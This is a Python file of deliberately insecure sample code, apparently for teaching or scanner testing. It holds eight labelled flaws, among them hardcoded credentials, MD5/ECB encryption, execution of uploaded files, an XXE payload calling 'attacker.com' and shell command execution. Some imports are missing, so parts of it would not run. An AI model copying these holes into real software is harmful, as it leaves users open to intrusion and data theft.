# Sample code with multiple security vulnerabilities

# Vulnerability 1: Sensitive Data Exposure
# Storing a password in plaintext
password = "mysecretpassword"

# Vulnerability 2: Insecure Cryptography
# Using an insecure encryption algorithm
import base64
import hashlib

def insecure_crypto(data):
    key = hashlib.md5(b'secret_key').digest()
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(data))

# Vulnerability 3: Insecure File Uploads
# Allowing users to upload and execute files
def insecure_file_upload(file_data):
    # Save and execute the uploaded file (for demonstration only)
    with open("uploads/user_uploaded_file.exe", "wb") as f:
        f.write(file_data)
    subprocess.Popen("uploads/user_uploaded_file.exe")

# Vulnerability 4: Security Misconfiguration
# Misconfigured access control (for demonstration only)
def insecure_access_control(user):
    if user == "admin":
        return "Admin panel accessed!"
    return "Regular user panel accessed!"

# Vulnerability 5: Authentication Bypass
# Weak authentication mechanism (for demonstration only)
def insecure_authentication(username, password):
    if username == "admin" and password == "password":
        return "Authentication successful"
    return "Authentication failed"

# Vulnerability 6: Cross-Site Request Forgery (CSRF)
# Missing anti-CSRF tokens (for demonstration only)
def insecure_csrf(user_id):
    return f'<a href="/delete_account?id={user_id}">Delete My Account</a>'

# Vulnerability 7: XML External Entity (XXE) Injection
# Including an XML file that is vulnerable to XXE attacks
import lxml.etree as ET

xml_data = """
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/evil-xxe-file">
]>
<root>
  <data>&xxe;</data>
</root>
"""

root = ET.fromstring(xml_data)

# Vulnerability 8: Remote Code Execution
# Allowing arbitrary code execution (for demonstration only)
def insecure_code_execution(command):
    import subprocess
    result = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    return result.stdout.read()

if __name__ == "__main__":
    # Example usages of the insecure functions (for demonstration only)
    print("Sensitive Data Exposure:", password)
    print("Insecure Cryptography:", insecure_crypto("mysecretdata"))
    print("Security Misconfiguration:", insecure_access_control("admin"))
    print("Authentication Bypass:", insecure_authentication("admin", "password"))
    print("Cross-Site Request Forgery (CSRF):", insecure_csrf("123"))
    print("XML External Entity (XXE) Injection:", root)
    print("Remote Code Execution:", insecure_code_execution("whoami"))
